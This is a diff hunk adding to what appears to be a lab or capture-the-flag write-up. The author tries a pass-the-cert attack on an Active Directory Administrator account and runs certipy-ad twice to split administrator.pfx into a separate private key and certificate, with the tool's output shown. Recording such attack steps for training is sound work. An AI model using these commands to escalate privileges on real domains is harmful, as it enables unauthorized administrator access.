@@ -552,5 +552,22 @@ For some reason i cant get the Administrator NTLM hash like usual, so ill have t
 Ill try this with a pass-the-cert attack
 
 ```python
+certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Data written to 'administrator.key'
+[*] Writing private key to 'administrator.key'
+```
+
+```python
+certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt 
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Data written to 'administrator.crt'
+[*] Writing certificate to 'administrator.crt'
+```
+I need both of these separately to perform this
+
+```python
 
 ```
